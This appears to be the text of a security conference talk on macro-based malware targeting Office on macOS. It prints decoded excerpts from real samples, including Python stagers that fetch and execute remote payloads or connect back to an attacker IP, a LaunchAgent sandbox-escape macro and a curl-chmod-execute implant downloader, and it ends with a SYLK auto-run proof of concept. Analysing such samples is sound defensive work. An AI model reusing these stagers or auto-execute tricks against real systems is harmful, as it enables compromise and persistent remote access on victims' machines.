Office Drama
...on macOS
WHOIS
@patrickwardle   
analysis 
exploit chain
OUTLINE
history
Evil Office Docs!
defense
Recent History
macro based attacks, targeting macOS
...defined
MACROS
Macro: 
"A macro is a series of commands & instructions that you group 
together as a single command to accomplish a task automatically"  
-Microsoft
Sub AutoOpen() 
  MsgBox "Hello World!", 0, "Title" 
End Sub 
01 
02 
03 
+
MSOffice document 
+ code
tl;dr: add code to documents
macro code (VBScript)
...of course (ab)used by attackers
MACROS
+
though mitigations...
now on macOS?
MACROS
more macs... 
malicious & potentially unwanted 
files for macOS (Kasperksy)
more mac malware... 
macro attack
2017
"New Attack, Old Tricks" 
 objective-see.com/blog/blog_0x17.html
"U.S. Allies and Rivals Digest 
Trump’s Victory - Carnegie 
Endowment for International 
Peace.docm"
discovery & (limited) 
detection
macro attack
2018 
"Word to Your Mac" 
objective-see.com/blog/blog_0x3A.html 
"BitcoinMagazine-
Quidax_InterviewQuestions_2018.docm"
download & exec 
2nd-stage (python) payload
sandbox escape!
discovery & (limited) 
detection
macro attack
2019 
"Cryptocurrency businesses still being targeted by Lazarus" 
securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus
"샘플_기술사업계획서(벤처기업평가용.doc"
is mac?
infected document  
(credit: kaspersky)
download & exec 
2nd-stage (mach-O) payload
Analysis
understanding macro based attacks
EXTRACTING EMBEDDED MARCOS
oletools, ftw
$ sudo pip install -U oletools 
$ olevba -c  
$ olevba -c ~/Documents/HelloWorld.docm  
olevba 0.55.1 on Python 3.7.3 - http://decalage.info/python/oletools 
===================================================================== 
FILE: /Users/patrick/Documents/HelloWorld.docm 
Type: OpenXML 
--------------------------------------------------------------------- 
VBA MACRO ThisDocument.cls  
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument' 
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen() 
  MsgBox "Hello World!", 0, "Title" 
End Sub 
github.com/decalage2/oletools
installation/usage
AutoOpen() 
"(automatically) runs after 
you open a new document"
macro extraction
"Description of behaviors of AutoExec & AutoOpen macros" 
support.microsoft.com/en-us/help/286310/description-of-behaviors-of-autoexec-and-autoopen-macros-in-word 
ANALYSIS:
"U.S. Allies & Rivals Digest Trump's Victory"
$ olevba -c "U.S. Allies and Rivals Digest Trump's Victory.docm" 
VBA MACRO ThisDocument.cls  
in file: word/vbaProject.bin 
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoopen() 
Fisher 
End Sub 
Public Sub Fisher() 
Dim result As Long 
    Dim cmd As String 
    cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBvcnQgc3" 
    cmd = cmd + "NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZm" 
    ... 
    result = system("echo ""import sys,base64;exec(base64.b64decode( 
                    \"" " & cmd & " \""));"" | python &") 
End Sub 
'Fisher' subroutine: 
automatically executed
concat base64-encoded str.
decode & exec via python
Fisher() embedded macros
via 'autoopen'
Sub 'Fisher()':
$ python 
>>> import base64 
>>> cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBv .... " 
>>> base64.b64decode(cmd) 
... 
dXFprvsgMBSIyPf = 'atfMzZOqVLbcj' 
import ssl; 
import sys, urllib2; 
import re, subprocess; 
cmd = "ps -ef | grep Little\ Snitch | grep -v grep" 
ps = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE) 
out = ps.stdout.read() 
ps.stdout.close() 
if re.search("Little Snitch", out): 
   sys.exit() 
... 
a = o.open('https://www.securitychecking.org:443/index.asp').read(); 
key = 'fff96aed07cb7ea65e7f031bd714607d'; 
S, j, out = range(256), 0, [] 
for i in range(256): 
   j = (j + S[i] + ord(key[i % len(key)])) % 256 
   S[i], S[j] = S[j], S[i] 
... 
exec(''.join(out))
"U.S. Allies & Rivals Digest Trump's Victory"
ANALYSIS:
decoded python code 
...looks familiar!?
LittleSnitch running?firewall check
Download 2nd-stage payload 
(www.securitychecking.org) 
RC4 decrypt this payload 
(key: fff96aed07cb7ea...)
Execute decrypted payload
EmPyre (python backdoor)
ANALYSIS:
"BitcoinMagazine-Quidax_InterviewQuestions_2018"
$ olevba -c "BitcoinMagazine-Quidax_InterviewQuestions_2018.docm" 
Private Sub Document_Open() 
payload = "import base64,sys;exec(base64.b64decode({2:str,3:lambda 
b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ" & 
"...6c30pCg==')));" 
path = Environ("HOME") &  
        "/../../../../Library/LaunchAgents/~$com.xpnsec.plist" 
arg = "\n" & _ 
"\n" & _ 
"\n" & _ 
"\n" & _ 
"Label\n" & _ 
"com.xpnsec.sandbox\n" & _ 
"ProgramArguments\n" & _ 
"\n" & _ 
"python\n" & _ 
"-c\n" & _ 
"" & payload & "" & _ 
"\n" & _ 
"RunAtLoad\n" & _ 
"\n" & _ 
"\n" & _ 
"" 
Result = system("echo """ & arg & """ > '" & path & "'", "r") 
'Result = system("launchctl bootout gui/$UID", "r") 
End Sub 
'Document_Open()': 
triggers automatic execution
create ~$com.xpnsec.plist
decode & exec via python
$ python 
>>> import base64 
>>> payload = "aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs3IgeCBpbiByYW5n...30pCg==" 
>>> base64.b64decode(payload) 
"import socket,struct,time\nfor x in range(10):\n\ttry:
\n\t\ts=socket.socket(2,socket.SOCK_STREAM)
\n\t\ts.connect(('109.202.107.20',9622))\n\t\tbreak\n\texcept:
\n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l)
\nwhile len(d)I',s.recv(4))[0] 
d=s.recv(l) 
while len(d)\n" & _ 
"\n" & _ 
"\n" & _ 
"Label\n" & _ 
"com.xpnsec.sandbox\n" & _ 
... 
"" 
Result = system("echo """ & arg & """ > '" & path & "'", "r")
"Escaping the Microsoft Office Sandbox" 
objective-see.com/blog/blog_0x35.html
$ codesign --display -v --entitlements - "Microsoft Word.app" 
... 
com.apple.security.temporary-exception.sbpl 
(allow file-read* file-write* 
  (require-any 
    (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$")) 
  ) 
)
embedded macro code ..."stolen"!?
Word's Sandbox Profile
"....allows us to create a file anywhere on the 
filesystem as long as it ends with ~$something"   
-(Adam Chester)
sandbox escape via 
/Library/LaunchAgents/~$com.xpnsec.plist
Adam's PoC
ANALYSIS:
"샘플_기술사업계획서(벤처기업평가용.doc"
$ olevba -c "샘플_기술사업계획서(벤처기업평가용.doc" 
Sub AutoOpen() 
... 
#If Mac Then 
 sur = "https://nzssdm.com/assets/mt.dat" 
 ... 
 res = system("curl -o " & spath & " " & sur) 
 res = system("chmod +x " & spath) 
 res = popen(spath, "r")
embedded (macOS-specific) 
macros
'AutoOpen()': 
triggers automatic execution
"Lazarus APT Targets Mac Users with Poisoned Word Document" 
labs.sentinelone.com/lazarus-apt-targets-mac-users-poisoned-word-document/
macOS-specific 
 logic
nzssdm.com
mt.dat 
(implant)
download payload (via curl)
set executable (via chmod +x)
execute (via popen)
Advanced Exploitation
a '0-click' macro based attack
...rather lame (and dysfunctional?)
CURRENT ATTACKS 
alert!
app sandbox
quarantine attribute 
+ notarizations
$ log stream 
Error kernel: (Quarantine) exec of /private/tmp/backdoor denied  
...since it was quarantined by Microsoft Word and created without user consent
AUTOMATIC MACRO EXECUTION
...with no alerts
Excel 2019
"In Office 2011 for Mac, XLM Macro's in Sylk files are auto executed 
(no protected mode or macro prompt)" 
-The MS Office Magic Show" (2018), Pieter Ceelen & Stan Hegt
only Office 2011, Microsoft: #wontfix
"The Microsoft Office (2016, 2019) for Mac option "Disable all macros 
without notification" enables XLM macros without prompting..." 
-CERT, vulnerability note VU#125336 (11/2019)
macro security 
no prompt!
latest version of Office! 
XLM MACROS IN SYLK FILES
...ollld file format!
"Abusing the SYLK file format" 
outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/
XLM: 
macro language predating VBA 
Sylk (.slk) files 
SYmbolic LinK, (1980s file format)}
still supported!
ID;P 
O;E 
NN;NAuto_open;ER101C1;KOut Flank;F 
C;X1;Y101;K0;ECALL("libc.dylib","system","JC","open -a Calculator") 
C;X1;Y102;K0;EHALT() 